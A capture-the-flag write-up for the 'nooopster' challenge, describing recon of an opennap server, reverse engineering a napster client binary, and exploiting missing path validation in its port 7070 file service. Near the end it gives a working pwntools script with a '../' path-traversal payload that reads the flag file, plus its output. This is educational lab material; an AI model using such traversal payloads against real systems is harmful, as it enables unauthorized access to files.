# nooopster
```none
Sharing files like its 1999. Connect to my network with OpenVPN.

nooopster.challenges.ooo 1999

Files:
* nooopster.ovpn 09a9782cf59564ca2c83ba679f864615674c712da6489e2e70c4895b135a4e43
* openvpn.shared.key 0d7937906ed4795db071b403a26c18b989f5efebc7e6c20defbb96b8cd5d10bd

tags: easy, pwn, reversing
```

Solved by leppan, [PewZ](https://twitter.com/0xbadcafe1), Pingop,
[zanderdk](https://twitter.com/alexanderkrog)


This was the first challenge I looked at in this CTF. I joined the CTF ~7
hours after it started, so my team had made some progress already.

After connecting to the VPN, zander figured out that the host 192.168.5.1 had
ports 7070 and 8888 open. We have a napster service running on port 8888, so
this seemed like the perfect place to start.

We started by reading a [napster protocol
spec](http://opennap.sourceforge.net/napster.txt) and connecting manually using
a Python script. During this initial recon phase we figured out that the server
was running opennap v0.44, which we were able to find the source for on some
random site.  At this point I got the idea that there might be a bug in
opennap, since the project was pretty old, and ended up spending an hour or so
just reading the source.

But this challenge is marked as easy, so we decided to take a step back and
interact with the server with a napster client. We ended up using
[nap](http://nap.sourceforge.net/dist/nap-1.5.4.tar.gz). When connecting, we're
greeted with the following message:

```none
     _.-------._
    |\          /|
   /| \_.----._/ |\                                  __
  .$:            :$.    _____  ____   _____  _____  / /__ ___   ____
 |$$:  ___  ___  :$$|  / __  // _  `// _   //  ___//  __// _ \ / ___/
  "$: \___\/___/ :$"  / / / // /_/ // /_/ /(__   )/  /_ /  __// /
    |     __     |   /_/ /_/ \__,_// ____//_____/ \___/ \___//_/mG!
    `.    \/    .'                /_/
      `. .__, .'
        `----'


* VERSION opennap 0.44
* SERVER (none)
* There have been 2 connections to this server.
```

Now we spent some time trying to figure out what commands are available in the
client since none of us had used napster before. After reading `/help` for a
bit, we found out that we can list channels using `/clist`:

```none
Channel | Users | Topic
-----------------------
#chat - 1 - Welcome to the #chat channel.
```

Let's join that channel using `/join`:
```none
* Users:
[user             ][nooopster        ]
* Topic for #chat: Welcome to the #chat channel.
```

A little while after joining we noticed that the `nooopster` client started
sending messages:

```none
<nooopster> have you seen my cool stuff?
<nooopster> am I on your hotlist?
<nooopster> what are you waiting for...
<nooopster> hey there! check out my files
```

Napster is a file sharing service after all, so let's take a look at the files
shared by `nooopster` using `/browse`. We get a list of 202 files back, all of
them being .mp3 files except for the last one:

```none
[...]
180) Tommy Page - I'll Be Your Everything.mp3                                    │   24  │  10:00
181) Toni Braxton - Breathe Again.mp3                                            │   24  │  10:00
182) Toni Braxton - Un-Break My Heart.mp3                                        │   24  │  10:00
183) Tracy Chapman - Give Me One Reason.mp3                                      │   24  │  10:00
184) UB40 - Can't Help Falling In Love (From Sliver).mp3                         │   24  │  10:00
185) Usher - My Way.mp3                                                          │   24  │  10:00
186) Usher - Nice & Slow.mp3                                                     │   24  │  10:00
187) Usher - You Make Me Wanna....mp3                                            │   24  │  10:00
188) Vanessa Carlton - A Thousand Miles.mp3                                      │   24  │  10:00
189) Vanessa Williams - Save The Best For Last.mp3                               │   24  │  10:00
190) Vanilla Ice - Ice Ice Baby.mp3                                              │   24  │  10:00
191) Whitney Houston - All The Man That I Need.mp3                               │   24  │  10:00
192) Whitney Houston - Exhale (Shoop Shoop) (From Waiting To Exhale).mp3         │   24  │  10:00
193) Whitney Houston - I Will Always Love You.mp3                                │   24  │  10:00
194) Whitney Houston - I'm Your Baby Tonight.mp3                                 │   24  │  10:00
195) Whitney Houston Feat. Faith Evans & Kelly Price - Heartbreak Hotel.mp3      │   24  │  10:00
196) Will Smith - Switch.mp3                                                     │   24  │  10:00
197) Wilson Phillips - Hold On.mp3                                               │   24  │  10:00
198) Wilson Phillips - Impulsive.mp3                                             │   24  │  10:00
199) Wilson Phillips - Release Me.mp3                                            │   24  │  10:00
200) Wilson Phillips - You're In Love.mp3                                        │   24  │  10:00
201) Wreckx-N-Effect - Rump Shaker.mp3                                           │   24  │  10:00
202) nooopster
```

We downloaded the `nooopster` file, which turned out to be the binary used by
the client.  After reversing for a while we figured out that the client was
doing something like this:

1. `chdir()` into the `shared` directory
2. connect to the server
3. register as `nooopster`
4. start a listening thread on port 7070 (see descriptions below)
5. send a `MSG_CLIENT_ADD_FILE` command for each file in `shared`. these are
   all the files we see when browsing `nooopster`'s files.
6. loop forever, sending the different chat messages listed above and listening
   for messages from the server

When the client receives a `MSG_SERVER_UPLOAD_REQUEST` message from the server,
which means that someone (us) has requested a file, the username of the client
requesting the file will be added to a global linked list. The function looks
something like this:

```c
void add_to_list(char *user)
{
	struct list_entry *new, *tmp;

	if (!in_list(user)) {
		pthread_mutex_lock(&mutex);

		new = malloc(sizeof(*new));
		new->username = user;
		tmp = g_list;
		g_list = new;
		new->next = tmp;

		pthread_mutex_unlock(&mutex);
	}
}
```

So what is this list used for? Turns out it's used in the thread function
mentioned earlier. Let's look at what the thread is doing:
1. create a TCP socket and listen on port 7070
2. accept new connections
3. start a new thread for each connection and handle it in the function at
   `0x21d0`

The connection handler performs the following actions:
1. send "1" to the connected client
2. receive 3 bytes and verify that they are "GET"
3. verify that the message contains 3 fields, e.g. `user "<path>" 0`
	* an example of a valid message (which we found by looking at wireshark)
	  is: `username "\shared\nooopster" 0`
4. verify that `user` is in the list (`g_list`)
5. check that `path` starts with `\shared\`

There is no path validation, so we can ask for files that are outside
`\shared\`!
To pass the check in step 4, we have to make sure that our user is added to the
list, which we can do by requesting a file in the napster client. If we send a
message to the nooopster client on port 7070 requesting a file outside the
share directory the client will send the contents back to us :)

Here's a script that requests `/flag`:

```python
from pwn import *

io = remote("192.168.5.1", 7070)

tmp = io.recv(1)
io.send(b"GET")

payload = b"user \"\shared\../../../../../flag\" 0"
io.send(payload)
log.info(io.recvall())
```

Let's get the flag!

```console
$ python3 solve.py
[+] Opening connection to 192.168.5.1 on port 7070: Done
[+] Receiving all data: Done (25B)
[*] Closed connection to 192.168.5.1 port 7070
[*] 23OOO{M4573R_0F_PUPP375}
```
